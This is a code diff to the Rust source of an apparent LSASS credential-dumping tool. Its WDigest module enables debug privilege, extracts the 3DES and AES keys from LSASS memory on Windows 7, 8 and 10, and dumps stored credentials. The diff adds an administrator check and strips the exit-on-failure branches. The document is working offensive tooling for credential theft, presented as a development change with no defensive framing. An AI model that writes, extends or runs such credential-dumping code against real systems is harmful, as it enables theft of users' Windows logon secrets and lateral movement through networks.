@@ -166,6 +166,10 @@ pub struct Wdigest;
 
 impl Wdigest {
     pub fn grab() -> Result<()> {
+        if !Utils::is_elevated() {
+            println!("[-] Program requires atleast administrative permissions");
+            return Ok(());
+        }
         let (debug_boolean, debug_result) = Utils::enable_debug_privilege();
         if debug_boolean {
             println!("{}", debug_result);
@@ -183,21 +187,18 @@ impl Wdigest {
                         1 => {
                             if let Ok(_) = find_keys_on_win7(handle) {
                                 if let Ok(_) = find_credentials(handle) {
-                                    process::exit(0x100);
                                 }
                             }
                         },
                         2 => {
                             if let Ok(_) = find_keys_on_win8(handle) {
                                 if let Ok(_) = find_credentials(handle) {
-                                    process::exit(0x100);
                                 }
                             }
                         },
                         3 => {
                             if let Ok(_) = find_keys_on_win10(handle) {
                                 if let Ok(_) = find_credentials(handle) {
-                                    process::exit(0x100);
                                 }
                             }
                         },
@@ -673,9 +674,6 @@ fn get_win_deskey_contents(lsass_handle: HANDLE, key_pointer: usize, win7: bool)
                 for i in 0..extracted3_des_key.hardkey.cbsecret {
                     WIN_G_DES_KEY[i as usize] = extracted3_des_key.hardkey.data[i as usize];
                 }
-            } else {
-                println!("[!] 3Deskey secret over 24 length: Failed to dump wdigest credentials");
-                process::exit(0x100);
             }
         } else {
             let mut h3_des_key_struct: RustBcryptHandleKey = std::mem::zeroed();
@@ -690,9 +688,6 @@ fn get_win_deskey_contents(lsass_handle: HANDLE, key_pointer: usize, win7: bool)
                 for i in 0..extracted3_des_key.hardkey.cbsecret {
                     WIN_G_DES_KEY[i as usize] = extracted3_des_key.hardkey.data[i as usize];
                 }
-            } else {
-                println!("[!] 3Deskey secret over 24 length: Failed to dump wdigest credentials");
-                process::exit(0x100);
             }
         }
     }
@@ -713,9 +708,6 @@ fn get_win_aeskey_contents(handle: HANDLE, key_pointer: usize, win7: bool) {
                 for i in 0..extracted_aes_key.hardkey.cbsecret {
                     WIN_G_AESKEY[i as usize] = extracted_aes_key.hardkey.data[i as usize];
                 }
-            } else {
-                println!("[!] AesKey secret over 24 length: Failed to dump wdigest credentials");
-                process::exit(0x100);
             }
         } else {
             let mut h_aes_key_struct: RustBcryptHandleKey = std::mem::zeroed();
@@ -730,9 +722,6 @@ fn get_win_aeskey_contents(handle: HANDLE, key_pointer: usize, win7: bool) {
                 for i in 0..extracted_aes_key.hardkey.cbsecret {
                     WIN_G_AESKEY[i as usize] = extracted_aes_key.hardkey.data[i as usize];
                 }
-            } else {
-                println!("[!] AesKey secret over 24 length: Failed to dump wdigest credentials");
-                process::exit(0x100);
             }
         }
     }
